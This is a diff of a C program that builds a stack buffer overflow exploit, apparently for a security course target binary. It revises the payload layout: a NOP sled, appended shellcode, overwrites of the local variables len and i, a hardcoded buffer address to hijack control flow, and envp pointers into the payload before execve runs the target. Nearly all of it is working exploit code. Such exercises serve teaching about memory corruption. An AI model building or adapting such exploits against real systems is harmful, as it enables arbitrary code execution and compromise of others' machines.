@@ -26,12 +26,12 @@ main ( int argc, char * argv[] )
   			0x2021fda0
 
   		% p &len
-			0x2021fea8
+			0x2021feac
 	
 		% p &i
-			0x2021feac
+			0x2021fea8
 
-		Difference between len and buf addresses is 264 bytes. We need to 
+		Difference between i and buf addresses is 264 bytes. We need to 
 		overwrite value of len.
 
 		Difference between instruction pointer of foo function frame and 
@@ -39,8 +39,8 @@ main ( int argc, char * argv[] )
 
 	*/
 
-	char exploit[284];
-	memset(exploit, '\x00', 284);
+	char exploit[283];
+	memset(exploit, '\x00', 283);
 
 	int i;
 
@@ -52,38 +52,34 @@ main ( int argc, char * argv[] )
 	strcat(exploit, shellcode); // append the shellcode to exploit string
 	strcat(exploit, "\x90\x90\x90"); // pad the shellcode to make it word-aligned
 
-	// fill remaining 88 bytes (till 264) of NOP instructions
-	for (i = 176; i < 264; i++){
+	// fill remaining 76 bytes of NOP instructions
+	for (i = 176; i < 252; i++){
 		exploit[i] = '\x90';
 	}
 
-	int newLen = 283;
+	// fill the 4 bytes with buffer start address.
+		// we'll use envp argument to jump back here
+	exploit[252] = '\xa0';
+	exploit[253] = '\xfd';
+	exploit[254] = '\x21';
+	exploit[255] = '\x20';
 
-	// fill 264th byte will new value of len
+	// fill with NOP instructions till 264th byte
+	for (i = 256; i < 264; i++){
+		exploit[i] = '\x90';
+	}
+
+	// skip over i
 	
-	exploit[264] = '\x1b';
+	exploit[264] = '\x0b';
 	exploit[265] = '\x01';
-	exploit[266] = '\x90';
-	exploit[267] = '\x90';
+	exploit[266] = '\x01';
+	exploit[267] = '\x01';
 
-	// keep i's address same
-//	exploit[268] = '\x10';
-//	exploit[269] = '\x01';
-//	exploit[270] = '\x00';
-//	exploit[271] = '\x00';
-
-	// jump over the value of i till 280 bytes
-	for (i = 272; i < 280; i++){
-		exploit[i] = '\x90';
-	}
-
-	// overwrite return address with buf start address
-	exploit[280] = '\xa0';
-	exploit[281] = '\xfd';
-	exploit[282] = '\x21';
-	exploit[283] = '\x20';
-
-	printf("STRLEN: %d\n", strlen(exploit));
+	// overwrite value of len to 283
+	exploit[268] = '\x1b';
+	exploit[269] = '\x01';
+	exploit[270] = '\x00';
 
 	args[0] = TARGET;
 
@@ -91,7 +87,8 @@ main ( int argc, char * argv[] )
 
 	args[2] = NULL;
 
-	env[0] = NULL;
+	env[0] = &exploit[270];
+	env[1] = &exploit[244];
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
